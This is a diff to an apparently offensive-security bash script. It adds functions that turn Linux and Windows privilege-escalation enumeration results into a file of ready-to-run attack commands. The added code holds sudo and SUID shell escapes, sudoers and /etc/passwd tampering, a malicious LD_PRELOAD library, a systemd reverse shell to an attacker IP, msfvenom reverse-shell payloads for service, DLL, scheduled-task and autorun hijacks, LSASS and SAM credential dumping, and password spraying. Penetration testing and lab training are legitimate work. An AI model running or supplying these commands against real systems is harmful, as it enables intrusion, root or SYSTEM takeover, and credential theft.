@@ -876,6 +876,266 @@ parse_linux_output() {
     success "Quick-wins report: $quickwins"
     echo ""
     cat "$quickwins"
+
+    # ── Post-parse attack commands ────────────────────────────────────────────
+    local acfile="$output_dir/attack_commands.txt"
+    {
+        echo "============================================================"
+        echo "  LINUX ESCALATION ATTACK COMMANDS"
+        echo "  Generated: $(date '+%Y-%m-%d %H:%M:%S')"
+        echo "  GTFObins: https://gtfobins.github.io/"
+        echo "============================================================"
+        echo ""
+
+        # Sudo NOPASSWD → exploit commands
+        local sudo_entries
+        sudo_entries=$(grep -iE "NOPASSWD" "$quickwins" 2>/dev/null | grep -v '^#\|^=')
+        if [[ -n "${sudo_entries}" ]]; then
+            echo "[ SUDO NOPASSWD ]"
+            echo "------------------------------------------------------------"
+            while IFS= read -r entry; do
+                [[ -z "${entry}" ]] && continue
+                local bin
+                bin=$(echo "${entry}" | grep -oP 'NOPASSWD:\s*\K\S+' | head -1)
+                bin=$(basename "${bin:-unknown}" 2>/dev/null)
+                echo "# ${entry}"
+                case "${bin}" in
+                    bash|sh|zsh|dash|fish)  echo "sudo ${bin} -p" ;;
+                    vim|vi)    echo "sudo ${bin}  # :!/bin/bash" ;;
+                    python|python2|python3) echo "sudo ${bin} -c 'import os; os.execl(\"/bin/bash\",\"bash\",\"-p\")'" ;;
+                    perl)      echo "sudo ${bin} -e 'exec \"/bin/bash\";'" ;;
+                    find)      echo "sudo ${bin} /. -exec /bin/bash \\;" ;;
+                    awk|gawk)  echo "sudo ${bin} 'BEGIN {system(\"/bin/bash\")}'" ;;
+                    env)       echo "sudo ${bin} /bin/bash" ;;
+                    less|more) echo "sudo ${bin} /etc/passwd  # type: !bash" ;;
+                    nmap)      echo "echo 'os.execute(\"/bin/bash\")' > /tmp/n.nse && sudo ${bin} --script /tmp/n.nse" ;;
+                    tee)       echo "echo 'ALL ALL=(ALL) NOPASSWD:ALL' | sudo ${bin} -a /etc/sudoers" ;;
+                    *)         echo "# https://gtfobins.github.io/gtfobins/${bin}/#sudo" ;;
+                esac
+                echo ""
+            done <<< "${sudo_entries}"
+        fi
+
+        # SUID binaries → exploit commands
+        local suid_entries
+        suid_entries=$(grep -E '/usr/|/bin/|/sbin/|/opt/' "$quickwins" 2>/dev/null | \
+            grep -vE 'ping$|su$|sudo$|passwd$|newgrp$|chfn$|chsh$|gpasswd$|pkexec$|mount$|umount$')
+        if [[ -n "${suid_entries}" ]]; then
+            echo "[ SUID BINARIES ]"
+            echo "------------------------------------------------------------"
+            while IFS= read -r suid_path; do
+                [[ -z "${suid_path}" ]] && continue
+                local suid_bin
+                suid_bin=$(basename "${suid_path}" | awk '{print $1}')
+                echo "# SUID: ${suid_path}"
+                case "${suid_bin}" in
+                    bash|sh|dash)   echo "${suid_path} -p" ;;
+                    find)           echo "${suid_path} /. -exec /bin/bash -p \\;" ;;
+                    vim|vi)         echo "${suid_path} -c ':!/bin/bash -p'" ;;
+                    python|python2|python3) echo "${suid_path} -c 'import os; os.execl(\"/bin/bash\",\"bash\",\"-p\")'" ;;
+                    perl)           echo "${suid_path} -e 'exec \"/bin/bash -p\";'" ;;
+                    env)            echo "${suid_path} /bin/bash -p" ;;
+                    awk|gawk)       echo "${suid_path} 'BEGIN {system(\"/bin/bash -p\")}'" ;;
+                    nmap)           echo "echo 'os.execute(\"/bin/bash -p\")' > /tmp/s.nse && ${suid_path} --script /tmp/s.nse" ;;
+                    *)              echo "# https://gtfobins.github.io/gtfobins/${suid_bin}/#suid" ;;
+                esac
+                echo ""
+            done <<< "${suid_entries}"
+        fi
+
+        # Writable critical files
+        if grep -qiE 'sudoers.*writable|writable.*sudoers' "$quickwins" 2>/dev/null; then
+            echo "[ WRITABLE SUDOERS ]"
+            echo "------------------------------------------------------------"
+            echo "echo '\$(whoami) ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"
+            echo "sudo bash"
+            echo ""
+        fi
+        if grep -qiE 'passwd.*writable|writable.*passwd' "$quickwins" 2>/dev/null; then
+            echo "[ WRITABLE /etc/passwd ]"
+            echo "------------------------------------------------------------"
+            echo "openssl passwd -1 hacked"
+            echo "echo 'root2:<HASH>:0:0:root:/root:/bin/bash' >> /etc/passwd"
+            echo "su root2  # password: hacked"
+            echo ""
+        fi
+
+        # NFS no_root_squash
+        if grep -qi 'no_root_squash' "$quickwins" 2>/dev/null; then
+            echo "[ NFS no_root_squash ]"
+            echo "------------------------------------------------------------"
+            echo "# On Kali — mount the export, copy bash, set SUID:"
+            echo "showmount -e <TARGET_IP>"
+            echo "mkdir /mnt/nfs && mount -t nfs <TARGET_IP>:/<EXPORT> /mnt/nfs"
+            echo "cp /bin/bash /mnt/nfs/bash && chmod +s /mnt/nfs/bash"
+            echo "# On target:"
+            echo "/mnt/<EXPORT_LOCALPATH>/bash -p"
+            echo ""
+        fi
+
+        # Capabilities
+        local cap_entries
+        cap_entries=$(grep -iE 'cap_setuid|cap_dac|cap_net_raw|cap_sys' "$quickwins" 2>/dev/null)
+        if [[ -n "${cap_entries}" ]]; then
+            echo "[ FILE CAPABILITIES ]"
+            echo "------------------------------------------------------------"
+            while IFS= read -r cap_line; do
+                [[ -z "${cap_line}" ]] && continue
+                echo "# ${cap_line}"
+                local cap_bin
+                cap_bin=$(echo "${cap_line}" | awk '{print $1}' | xargs basename 2>/dev/null)
+                case "${cap_line}" in
+                    *cap_setuid*)
+                        case "${cap_bin}" in
+                            python*) echo "${cap_bin} -c 'import os; os.setuid(0); os.execl(\"/bin/bash\",\"bash\",\"-p\")'" ;;
+                            perl)    echo "${cap_bin} -e 'use POSIX(setuid); POSIX::setuid(0); exec \"/bin/bash\";'" ;;
+                            *)       echo "# https://gtfobins.github.io/gtfobins/${cap_bin}/#capabilities" ;;
+                        esac ;;
+                    *cap_dac*)
+                        echo "# Read /etc/shadow: ${cap_bin} /etc/shadow" ;;
+                esac
+                echo ""
+            done <<< "${cap_entries}"
+        fi
+
+        # Interesting group membership → exploit commands
+        local group_hits
+        group_hits=$(grep -iE '\bdocker\b|\blxd\b|\blxc\b|\bdisk\b|\badm\b' "$quickwins" 2>/dev/null | head -5)
+        if [[ -n "${group_hits}" ]]; then
+            echo "[ INTERESTING GROUP MEMBERSHIP ]"
+            echo "------------------------------------------------------------"
+            if echo "${group_hits}" | grep -qi '\bdocker\b'; then
+                echo "# docker group — escape to host:"
+                echo "docker run -v /:/mnt --rm -it alpine chroot /mnt bash"
+                echo ""
+            fi
+            if echo "${group_hits}" | grep -qiE '\blxd\b|\blxc\b'; then
+                echo "# lxd/lxc group — privileged container escape:"
+                echo "# On Kali: build alpine image"
+                echo "git clone https://github.com/saghul/lxd-alpine-builder && cd lxd-alpine-builder && ./build-alpine"
+                echo "# Transfer .tar.gz to target, then:"
+                echo "lxc image import ./<IMAGE>.tar.gz --alias alpine"
+                echo "lxc init alpine privesc -c security.privileged=true"
+                echo "lxc config device add privesc hostdisk disk source=/ path=/mnt/root recursive=true"
+                echo "lxc start privesc && lxc exec privesc /bin/sh"
+                echo "# Inside container: chroot /mnt/root bash"
+                echo ""
+            fi
+            if echo "${group_hits}" | grep -qi '\bdisk\b'; then
+                echo "# disk group — raw device access:"
+                echo "df -h   # find root partition device (e.g. /dev/sda1)"
+                echo "debugfs /dev/sda1"
+                echo "# In debugfs: cat /etc/shadow  OR  cat /root/.ssh/id_rsa"
+                echo ""
+            fi
+            if echo "${group_hits}" | grep -qi '\badm\b'; then
+                echo "# adm group — read system logs for credentials:"
+                echo "grep -iE 'pass|password|secret|token|credential' /var/log/syslog /var/log/auth.log 2>/dev/null | head -20"
+                echo "grep -iE 'pass|password' /var/log/apache2/access.log 2>/dev/null | head -20"
+                echo ""
+            fi
+        fi
+
+        # Kernel version → searchsploit
+        local kernel_ver
+        kernel_ver=$(grep -oP 'Linux version \K[0-9]+\.[0-9]+\.[0-9]+' "$quickwins" 2>/dev/null | head -1)
+        if [[ -z "${kernel_ver}" ]]; then
+            kernel_ver=$(grep -oP '\buname.*?:\K\s*\K[0-9]+\.[0-9]+\.[0-9]+' "$quickwins" 2>/dev/null | head -1)
+        fi
+        if [[ -n "${kernel_ver}" ]]; then
+            echo "[ KERNEL VERSION — CVE LOOKUP ]"
+            echo "------------------------------------------------------------"
+            echo "# Kernel: ${kernel_ver}"
+            echo "searchsploit linux kernel ${kernel_ver%.*}"
+            echo "# Common high-value: DirtyPipe (5.8-5.16), PwnKit (pkexec), Baron Samedit (sudo < 1.9.5p2)"
+            echo "# Run les.sh on target: ./les.sh 2>/dev/null | head -40"
+            echo "# Last resort only — unstable exploits can crash the target"
+            echo ""
+        fi
+
+        # LD_PRELOAD / shared object hijack
+        if grep -qiE 'LD_PRELOAD|LD_LIBRARY_PATH|env_keep.*LD|\.so.*writable|shared object|RPATH' "$quickwins" 2>/dev/null; then
+            echo "[ SHARED OBJECT / LD_PRELOAD HIJACK ]"
+            echo "------------------------------------------------------------"
+            echo "# Compile malicious shared library:"
+            cat << 'CEOF'
+# shell.c:
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+void __attribute__((constructor)) init() {
+    setuid(0); setgid(0);
+    system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash");
+}
+CEOF
+            echo "gcc -shared -fPIC -o /tmp/shell.so /tmp/shell.c -nostartfiles"
+            echo ""
+            echo "# If sudo env_keep+=LD_PRELOAD:"
+            echo "sudo LD_PRELOAD=/tmp/shell.so <ALLOWED_CMD>"
+            echo "# Then: /tmp/rootbash -p"
+            echo ""
+            echo "# If SUID binary loads .so from writable dir:"
+            echo "# Find missing .so: strace <SUID_BIN> 2>&1 | grep 'No such file'"
+            echo "# Drop compiled shell.so at the missing path"
+            echo ""
+        fi
+
+        # Writable systemd units
+        if grep -qiE 'writable.*systemd|systemd.*writable|/etc/systemd.*write' "$quickwins" 2>/dev/null; then
+            echo "[ WRITABLE SYSTEMD UNIT ]"
+            echo "------------------------------------------------------------"
+            echo "# Inject reverse shell into ExecStart:"
+            echo "# 1. Find writable unit file (from linpeas output):"
+            echo "find /etc/systemd/system -writable -type f 2>/dev/null"
+            echo ""
+            echo "# 2. Modify ExecStart:"
+            echo "sed -i 's|^ExecStart=.*|ExecStart=/bin/bash -c \"bash -i >\\& /dev/tcp/<KALI_IP>/4444 0>\\&1\"|' /etc/systemd/system/<SERVICE>.service"
+            echo ""
+            echo "# 3. Reload and restart:"
+            echo "systemctl daemon-reload && systemctl restart <SERVICE>"
+            echo ""
+            echo "# 4. Catch on Kali:"
+            echo "nc -lvnp 4444"
+            echo ""
+        fi
+
+        # Credentials in files → crackr / sprayr routing
+        local cred_file_hits
+        cred_file_hits=$(grep -iE 'password[[:space:]]*[=:]|DefaultPassword|AutoLogon|cleartext|plaintext' "$quickwins" 2>/dev/null | head -5)
+        if [[ -n "${cred_file_hits}" ]]; then
+            echo "[ CREDENTIALS FOUND IN FILES ]"
+            echo "------------------------------------------------------------"
+            echo "# Plaintext credentials found — test and spray:"
+            echo "${cred_file_hits}" | sed 's/^/  /'
+            echo ""
+            echo "# Validate immediately:"
+            echo "./sprayr.sh -u <USER> -p '<FOUND_PASSWORD>' -t <TARGET_IP>"
+            echo "# OR hash-spray after cracking:"
+            echo "./crackr.sh -H '<HASH_IF_HASHED>' -q"
+            echo "./sprayr.sh --from-creds"
+            echo ""
+        fi
+
+        # Internal services
+        local internal_ports
+        internal_ports=$(grep -oP '127\.0\.0\.1:\K[0-9]+' "$quickwins" 2>/dev/null | sort -u)
+        if [[ -n "${internal_ports}" ]]; then
+            echo "[ INTERNAL SERVICES — tunnel from Kali ]"
+            echo "------------------------------------------------------------"
+            while IFS= read -r port; do
+                [[ -z "${port}" ]] && continue
+                echo "# Port ${port}:"
+                echo "ssh -N -L 127.0.0.1:${port}:127.0.0.1:${port} <USER>@<TARGET_IP>"
+                echo "# OR: ./pivotr.sh --mode local --local-port ${port} --target 127.0.0.1 --target-port ${port} --pivot-ip <TARGET_IP>"
+            done <<< "${internal_ports}"
+            echo ""
+        fi
+
+        echo "============================================================"
+    } > "${acfile}"
+
+    success "Attack commands → ${acfile}"
+    warn "cat ${acfile}  # ← START HERE for exploitation"
 }
 
 parse_windows_output() {
@@ -956,6 +1216,226 @@ parse_windows_output() {
     success "Quick-wins report: $quickwins"
     echo ""
     cat "$quickwins"
+
+    # ── Post-parse Windows attack commands ───────────────────────────────────
+    local acfile="$output_dir/attack_commands.txt"
+    {
+        echo "============================================================"
+        echo "  WINDOWS ESCALATION ATTACK COMMANDS"
+        echo "  Generated: $(date '+%Y-%m-%d %H:%M:%S')"
+        echo "============================================================"
+        echo ""
+
+        # Token privileges → Potato selection
+        local token_privs
+        token_privs=$(grep -iE "SeImpersonate|SeBackup|SeDebug|SeRestore|SeManageVolume" "$quickwins" 2>/dev/null)
+        if [[ -n "${token_privs}" ]]; then
+            echo "[ TOKEN PRIVILEGES ]"
+            echo "------------------------------------------------------------"
+            if echo "${token_privs}" | grep -qi "SeImpersonate"; then
+                echo "# SeImpersonate — Potato escalation:"
+                echo "# Win10/Server 2016-2019: PrintSpoofer64.exe -i -c cmd.exe"
+                echo "# Win8-11/Server 2012-2022: SigmaPotato.exe cmd.exe"
+                echo "# Broad fallback: GodPotato-NET4.exe -cmd 'cmd /c whoami'"
+                echo "# Missing privs first? FullPowers.exe -c \"cmd.exe /c whoami\" -z"
+            fi
+            if echo "${token_privs}" | grep -qi "SeBackup"; then
+                echo "# SeBackup — dump SAM/SYSTEM hive:"
+                echo "reg save HKLM\\SAM C:\\Temp\\sam.hive"
+                echo "reg save HKLM\\SYSTEM C:\\Temp\\sys.hive"
+                echo "# Exfil to Kali then: impacket-secretsdump -sam sam.hive -system sys.hive LOCAL"
+            fi
+            if echo "${token_privs}" | grep -qi "SeDebug"; then
+                echo "# SeDebug — dump LSASS:"
+                echo "# Option A: Task Manager → Details → lsass.exe → Create Dump File"
+                echo "# Option B: procdump64.exe -accepteula -ma lsass.exe lsass.dmp"
+                echo "# Exfil + parse: impacket-secretsdump -just-dc-ntlm -outputfile hashes -ntds lsass.dmp LOCAL"
+            fi
+            echo ""
+        fi
+
+        # Stored credentials → runas
+        if grep -qi 'Target:' "$quickwins" 2>/dev/null; then
+            echo "[ STORED CREDENTIALS (cmdkey) ]"
+            echo "------------------------------------------------------------"
+            echo "cmdkey /list"
+            echo "runas /savecred /user:<DOMAIN>\\<USER> cmd.exe"
+            echo "# OR: RunasCs.exe <USER> <PASS> cmd.exe -b  (bypasses UAC)"
+            echo ""
+        fi
+
+        # AlwaysInstallElevated
+        if grep -qi 'AlwaysInstallElevated' "$quickwins" 2>/dev/null; then
+            echo "[ ALWAYS INSTALL ELEVATED ]"
+            echo "------------------------------------------------------------"
+            echo "# Both HKCU + HKLM must be 1. If so:"
+            echo "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=4444 -f msi -o evil.msi"
+            echo "msiexec /quiet /qn /i evil.msi"
+            echo "nc -lvnp 4444"
+            echo ""
+        fi
+
+        # Unquoted service paths
+        if grep -qi 'unquoted\|Program Files.*\.exe' "$quickwins" 2>/dev/null; then
+            echo "[ UNQUOTED SERVICE PATHS ]"
+            echo "------------------------------------------------------------"
+            echo "# Example: C:\\Program Files\\Vuln Service\\service.exe"
+            echo "# Drop payload at: C:\\Program.exe or C:\\Program Files\\Vuln.exe"
+            echo "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=4444 -f exe -o Program.exe"
+            echo "# Upload Program.exe, then restart service:"
+            echo "sc stop <SERVICE_NAME> && sc start <SERVICE_NAME>"
+            echo "# OR: shutdown /r /t 0  (if no manual restart possible)"
+            echo ""
+        fi
+
+        # Modifiable service binary
+        if grep -qi 'modifiable\|Full Control.*service' "$quickwins" 2>/dev/null; then
+            echo "[ MODIFIABLE SERVICE BINARY ]"
+            echo "------------------------------------------------------------"
+            echo "# Replace the service binary with a reverse shell:"
+            echo "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=4444 -f exe -o shell.exe"
+            echo "# Backup original: copy C:\\Path\\To\\service.exe C:\\Temp\\service.bak"
+            echo "# Replace: copy shell.exe C:\\Path\\To\\service.exe /y"
+            echo "sc stop <SERVICE_NAME> && sc start <SERVICE_NAME>"
+            echo "nc -lvnp 4444"
+            echo ""
+        fi
+
+        # DLL hijacking
+        if grep -qi 'NAME NOT FOUND\|DLL.*writable' "$quickwins" 2>/dev/null; then
+            echo "[ DLL HIJACKING ]"
+            echo "------------------------------------------------------------"
+            echo "# Compile a malicious DLL (cross-compile from Kali):"
+            echo "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=4444 -f dll -o missing.dll"
+            echo "# OR compile C DLL:"
+            echo "x86_64-w64-mingw32-gcc -shared -o missing.dll shell.c"
+            echo "# Place in the writable directory where the missing DLL is searched"
+            echo "nc -lvnp 4444"
+            echo ""
+        fi
+
+        # SeManageVolumePrivilege
+        if grep -qi 'SeManageVolume' "$quickwins" 2>/dev/null; then
+            echo "[ SeManageVolumePrivilege ]"
+            echo "------------------------------------------------------------"
+            echo "# SeManageVolumeExploit → DLL hijack → SYSTEM:"
+            echo "# Download: https://github.com/CsEnox/SeManageVolumeExploit"
+            echo "iwr -uri http://<KALI_IP>/SeManageVolumeExploit.exe -OutFile C:\\Temp\\smve.exe"
+            echo "# Run exploit — sets Full Control on C:\\Windows\\System32 for current user"
+            echo ".\\smve.exe"
+            echo "# Then DLL hijack a SYSTEM service — example with tzres.dll:"
+            echo "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=4444 -f dll -o tzres.dll"
+            echo "copy tzres.dll C:\\Windows\\System32\\wbem\\tzres.dll"
+            echo "# Trigger: run systeminfo (loads tzres.dll)"
+            echo "nc -lvnp 4444"
+            echo ""
+        fi
+
+        # Writable scheduled task binary
+        if grep -qi 'schtasks\|scheduled task' "$quickwins" 2>/dev/null; then
+            echo "[ SCHEDULED TASK — writable binary ]"
+            echo "------------------------------------------------------------"
+            echo "# Find scheduled task running as SYSTEM with a writable binary:"
+            echo "schtasks /query /fo LIST /v | findstr /i 'Task To Run\\|Run As\\|Status'"
+            echo "# Check binary permissions: icacls C:\\path\\to\\task\\binary.exe"
+            echo "# If writable (F or M for Users/Everyone):"
+            echo "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=4444 -f exe -o task.exe"
+            echo "copy task.exe C:\\path\\to\\task\\binary.exe /y"
+            echo "# Wait for task trigger, or force run:"
+            echo "schtasks /run /tn '<TASK_NAME>'"
+            echo "nc -lvnp 4444"
+            echo ""
+        fi
+
+        # Registry autoruns
+        if grep -qi 'autorun\|CurrentVersion\\Run\|HKLM.*Run\|HKCU.*Run' "$quickwins" 2>/dev/null; then
+            echo "[ REGISTRY AUTORUNS — writable binary ]"
+            echo "------------------------------------------------------------"
+            echo "# Check autorun paths:"
+            echo "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
+            echo "reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
+            echo "# For each writable binary: icacls <PATH>"
+            echo "# If writable (F or M for Users):"
+            echo "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=4444 -f exe -o update.exe"
+            echo "copy update.exe C:\\path\\to\\autorun\\binary.exe /y"
+            echo "# Trigger: wait for logon/reboot, or"
+            echo "shutdown /r /t 0"
+            echo "nc -lvnp 4444"
+            echo ""
+        fi
+
+        # AutoLogon DefaultPassword → runas
+        if grep -qi 'DefaultPassword\|AutoAdminLogon\|autologon' "$quickwins" 2>/dev/null; then
+            echo "[ AUTOLOGON CREDENTIALS ]"
+            echo "------------------------------------------------------------"
+            echo "# Extract full credentials:"
+            echo "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\""
+            echo "# Look for DefaultUserName, DefaultPassword, DefaultDomain"
+            echo ""
+            echo "# Validate immediately:"
+            echo "# Spray the password:"
+            echo "./sprayr.sh -u <DefaultUserName> -p '<DefaultPassword>' -t <TARGET_IP>"
+            echo ""
+            echo "# Use with RunasCs if you can't PTH:"
+            echo ".\\RunasCs.exe <DefaultUserName> '<DefaultPassword>' cmd.exe"
+            echo ".\\RunasCs.exe <DefaultUserName> '<DefaultPassword>' cmd.exe -b  # UAC bypass"
+            echo ""
+        fi
+
+        # PowerShell history → check for creds
+        if grep -qi 'ConsoleHost_history\|PSReadline\|PSReadLine' "$quickwins" 2>/dev/null; then
+            echo "[ POWERSHELL HISTORY ]"
+            echo "------------------------------------------------------------"
+            echo "# Read full PS history:"
+            echo "type \$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt"
+            echo ""
+            echo "# Grep for credentials:"
+            echo "Select-String -Path \$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt -Pattern 'pass|secret|cred|token|-p |password'"
+            echo ""
+            echo "# If plaintext creds found → spray:"
+            echo "./sprayr.sh -u <USER> -p '<FOUND_PASS>' -t <TARGET_IP>"
+            echo ""
+        fi
+
+        # KeePass .kdbx → keepass2john → crackr
+        if grep -qi '\.kdbx\|keepass' "$quickwins" 2>/dev/null; then
+            echo "[ KEEPASS DATABASE ]"
+            echo "------------------------------------------------------------"
+            echo "# 1. Find the .kdbx file:"
+            echo "Get-ChildItem -Path C:\\ -Recurse -Include *.kdbx -ErrorAction SilentlyContinue"
+            echo ""
+            echo "# 2. Exfil to Kali, then crack master password:"
+            echo "./crackr.sh -e keepass -f /tmp/db.kdbx -q"
+            echo "# OR: keepass2john db.kdbx > kp.hash && ./crackr.sh -f kp.hash -q"
+            echo ""
+            echo "# 3. Open database (once cracked):"
+            echo "kpcli --kdb db.kdbx  # Kali: sudo apt install kpcli"
+            echo ""
+        fi
+
+        # Internal listeners
+        local win_internal
+        win_internal=$(grep -oP '127\.0\.0\.1:\K[0-9]+' "$quickwins" 2>/dev/null | sort -u)
+        if [[ -n "${win_internal}" ]]; then
+            echo "[ INTERNAL LISTENERS — tunnel from Kali ]"
+            echo "------------------------------------------------------------"
+            while IFS= read -r port; do
+                [[ -z "${port}" ]] && continue
+                echo "# Port ${port}:"
+                echo "# Upload chisel to target, then:"
+                echo "# Kali:   ./chisel server -p 8888 --reverse"
+                echo "# Target: chisel.exe client <KALI_IP>:8888 R:${port}:127.0.0.1:${port}"
+                echo "# OR SSH tunnel (if SSH available):"
+                echo "ssh -N -L 127.0.0.1:${port}:127.0.0.1:${port} <USER>@<TARGET_IP>"
+            done <<< "${win_internal}"
+            echo ""
+        fi
+
+        echo "============================================================"
+    } > "${acfile}"
+
+    success "Attack commands → ${acfile}"
+    warn "cat ${acfile}  # ← START HERE for exploitation"
 }
 
 #==============================================================================
